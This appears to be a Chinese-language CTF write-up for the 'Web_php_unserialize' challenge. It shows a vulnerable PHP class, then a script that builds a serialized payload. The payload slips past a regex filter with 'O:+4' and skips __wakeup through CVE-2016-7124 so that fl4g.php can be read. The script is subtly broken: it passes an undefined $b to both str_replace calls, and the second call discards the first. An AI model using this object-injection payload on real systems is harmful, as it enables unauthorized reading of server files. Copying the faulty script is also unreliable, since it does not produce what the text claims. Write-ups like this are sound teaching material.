## Web_php_unserialize

php反序列化加一些奇奇怪怪的绕过

题目源码

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

我们希望能读到fl4g.php

所以要借助反序列化中的__destruct()函数，但是\_\_wakeup()会覆盖我们写进去的地址

这里涉及到一个漏洞

[CVE-2016-7124](https://bugs.php.net/bug.php?id=72663)

简单来说就是**当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行**

那么preg_match的过滤怎么办呢

根据正则表达式的语法可知，检测的应该是类似 O:4:这样的

>  [oc]字符组 /d 数字 /i 忽略大小写

可以加个+来绕过

一开始自己写序列化对象怎么写都不对

但其实可以用php输出一个序列化对象，然后再改。。。。

或者也可以直接用脚本

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
    $o = new Demo('fl4g.php');
    $s = serialize($o);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $s = str_replace('O:4', 'O:+4',$b);//绕过__preg_match
    $s = str_replace(':1:', ':2:',$b);//绕过__wakeup
    echo (base64_encode($s));//payload
 ?>
```



### 参考资料

正则表达式：

https://www.cnblogs.com/zery/p/3438845.html

https://blog.csdn.net/weixin_33682790/article/details/85996972